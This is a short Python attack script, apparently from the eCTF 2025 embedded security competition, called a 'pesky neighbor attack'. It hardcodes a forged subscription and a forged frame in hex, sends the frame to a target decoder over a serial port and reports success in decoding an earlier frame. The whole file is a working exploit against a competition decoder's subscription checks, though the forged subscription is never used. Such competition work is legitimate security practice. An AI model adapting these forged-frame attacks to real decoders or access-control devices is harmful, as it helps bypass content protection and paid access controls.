import time
import sys
import struct

from ectf25.utils.decoder import DecoderIntf

forged_sub = '8724fdbeb620d2a862223c695cab2048ab70fb3ab7dfa159fc738562d7b6f1b83d21aeb5675f88279ffb225cfd08f54a'
forged_frame = 'f3f38a71a0f048f1bc253c6992e3fe692d609354c0b7c82a9f1be40c899697d4b6e1b631092ca31f6ad7a1125fa3f2a286c8835a2324a402ee3c1e85794ddc6bb95bd8ed0050bae49f1cc2f13dd23a3b39d00a6db97ba6887c01a50e'

if __name__ == "__main__":
    print("Running pesky neighbor attack")

    time.sleep(1)

    decoder = DecoderIntf(sys.argv[1])

    decoder.list()

    decoder.decode(bytes.fromhex(forged_frame))

    print("Successfully decoded earlier frame")
